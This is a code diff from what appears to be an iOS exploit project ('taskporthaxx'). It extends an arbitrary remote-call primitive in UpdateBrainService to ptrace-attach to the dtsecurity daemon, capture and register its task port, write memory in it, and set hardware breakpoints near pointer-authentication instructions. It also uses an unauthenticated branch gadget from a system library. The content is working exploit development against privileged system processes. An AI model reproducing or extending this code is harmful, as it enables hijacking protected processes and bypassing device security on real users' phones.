@@ -14,6 +14,8 @@
 #import "ViewController.h"
 #import "Header.h"
 
+thread_t dtsecurity_thread;
+
 NSDictionary *getLaunchdStringOffsets(void) {
     NSMutableDictionary *dict = [NSMutableDictionary dictionary];
     
@@ -118,6 +120,10 @@ NSDictionary *getLaunchdStringOffsets(void) {
     self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_exception_server"];
     self.ubProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.updatebrain_exception_server"];
     
+    // preflight UpdateBrainService
+    [self.ubProc spawnProcess:@"updatebrain" suspended:NO];
+    printf("Spawned UpdateBrainService with PID %d\n", self.ubProc.pid);
+    
     // TODO: save offsets
     // unauthenticated br x8 gadget
     void *handle = dlopen("/usr/lib/swift/libswiftDistributed.dylib", RTLD_GLOBAL);
@@ -213,23 +219,33 @@ NSDictionary *getLaunchdStringOffsets(void) {
 }
 
 - (void)testButtonTapped {
-    [self.dtProc spawnProcess:@"dtsecurity" suspended:YES];
-    printf("Spawned dtsecurity with PID %d\n", self.dtProc.pid);
-    [self.ubProc spawnProcess:@"updatebrain" suspended:NO];
-    printf("Spawned UpdateBrainService with PID %d\n", self.ubProc.pid);
+    printf("Currently do nothing\n");
 }
 
 - (void)arbCallButtonTapped {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        kern_return_t kr;
-        vm_size_t page_size = getpagesize();
+        [self.dtProc spawnProcess:@"dtsecurity" suspended:YES];
+        printf("Spawned dtsecurity with PID %d\n", self.dtProc.pid);
         
+        // attach to dtsecurity
+        int ret = (int)RemoteArbCall(self.ubProc, ptrace, PT_ATTACHEXC, self.dtProc.pid, 0, 0);
+        printf("ptrace(PT_ATTACHEXC) returned %d\n", ret);
+        ret = (int)RemoteArbCall(self.ubProc, ptrace, PT_CONTINUE, self.dtProc.pid, 1, 0);
+        printf("ptrace(PT_CONTINUE) returned %d\n", ret);
+        
+        while (!self.dtProc.newState) {
+#warning TODO: maybe another semaphore
+            usleep(200000);
+        }
         dtsecurityTaskPort = self.dtProc.taskPort;
         bootstrap_register(bootstrap_port, "com.kdt.taskporthaxx.dtsecurity_task_port", dtsecurityTaskPort);
         if(!dtsecurityTaskPort) {
             printf("dtsecurity task port is null?\n");
             return;
         }
+        
+        kern_return_t kr;
+        vm_size_t page_size = getpagesize();
         
         // create a region which holds temp data
         vm_address_t map = RemoteArbCall(self.ubProc, mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
@@ -266,8 +282,12 @@ NSDictionary *getLaunchdStringOffsets(void) {
             return;
         }
         threads = [self.ubProc read64:threads];
-        thread_t dtsecurity_thread = (thread_t)[self.ubProc read32:threads];
+        dtsecurity_thread = (thread_t)[self.ubProc read32:threads];
         printf("dtsecurity thread port: 0x%x\n", dtsecurity_thread);
+        
+        // ptrace PT_THUPDATE
+//        ret = (kern_return_t)RemoteArbCall(self.ubProc, thread_suspend, dtsecurity_thread);
+//        printf("thread_suspend returned %d\n", ret);
         
         // Get dtsecurity debug state
         arm_debug_state64_t *debug_state = (arm_debug_state64_t *)(map + 0x10);
@@ -290,7 +310,7 @@ NSDictionary *getLaunchdStringOffsets(void) {
         [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0x1e5];
         [self.ubProc write64:(uint64_t)&debug_state->__bvr[1] value:pacia_inst+4];
         [self.ubProc write64:(uint64_t)&debug_state->__bcr[1] value:0x1e5];
-        [self.ubProc write64:(uint64_t)&debug_state->__mdscr_el1 value:1]; // SS_ENABLE
+        //[self.ubProc write64:(uint64_t)&debug_state->__mdscr_el1 value:1]; // SS_ENABLE
         kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
         if (kr != KERN_SUCCESS) {
             printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
@@ -298,22 +318,37 @@ NSDictionary *getLaunchdStringOffsets(void) {
         }
         printf("Set hardware breakpoints\n");
         
+        
+        ret = (int)RemoteArbCall(self.ubProc, ptrace, PT_THUPDATE, self.dtProc.pid, dtsecurity_thread, 0);
+        printf("ptrace(PT_THUPDATE) returned %d\n", ret);
+        ret = (kern_return_t)RemoteArbCall(self.ubProc, thread_resume, dtsecurity_thread);
+        printf("thread_resume returned %d\n", ret);
+        RemoteArbCall(self.ubProc, kill, self.dtProc.pid, SIGCONT);
+        
         self.dtProc.expectedLR = 0;
         
-        //self.dtProc.newState->__pc = 0x41414140;
-        //self.dtProc.newState->__flags = 0;
         [self.dtProc resume];
         printf("Resume 1:\n");
-        printf(" pc: 0x%016llx\n", self.dtProc.newState->__pc);
-        printf("x16: 0x%016llx\n", self.dtProc.newState->__x[16]);
-        printf("x08: 0x%016llx\n", self.dtProc.newState->__x[8]);
-        /*
+        DumpRegisters(self.dtProc.newState);
+        
+        ret = (int)RemoteArbCall(self.ubProc, ptrace, PT_THUPDATE, self.dtProc.pid, dtsecurity_thread, 0);
+        printf("ptrace(PT_THUPDATE) returned %d\n", ret);
+        ret = (kern_return_t)RemoteArbCall(self.ubProc, thread_resume, dtsecurity_thread);
+        printf("thread_resume returned %d\n", ret);
+        RemoteArbCall(self.ubProc, kill, self.dtProc.pid, SIGCONT);
+        
         [self.dtProc resume];
         printf("Resume 2:\n");
-        printf(" pc: 0x%016llx\n", self.dtProc.newState->__pc);
-        printf("x16: 0x%016llx\n", self.dtProc.newState->__x[16]);
-        printf("x08: 0x%016llx\n", self.dtProc.newState->__x[8]);
-        */
+        DumpRegisters(self.dtProc.newState);
+        
+        
+#if 0
+        // debugserver
+        task_suspend
+        thread_convert_thread_state
+        thread_set_state hw single step
+#endif
+        
 #if 0
         // Create a region which holds temp data (should we use stack instead?)
         void *map = RemoteArbCallOld(mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
@@ -545,12 +580,12 @@ NSDictionary *getLaunchdStringOffsets(void) {
 
 - (void)detachButtonTapped {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        //RemoteArbCall(self.ubProc, task_self_trap);
+        kern_return_t ret = (int)RemoteArbCall(self.ubProc, ptrace, PT_THUPDATE, self.dtProc.pid, dtsecurity_thread, 0x13);
+        printf("ptrace(PT_THUPDATE) returned %d\n", ret);
+        RemoteArbCall(self.ubProc, kill, self.dtProc.pid, SIGCONT);
         [self.dtProc resume];
-        printf("Resume 1:\n");
-        printf(" pc: 0x%016llx\n", self.dtProc.newState->__pc);
-        printf("x16: 0x%016llx\n", self.dtProc.newState->__x[16]);
-        printf("x08: 0x%016llx\n", self.dtProc.newState->__x[8]);
+        printf("Resume:\n");
+        DumpRegisters(self.dtProc.newState);
     });
 }
 
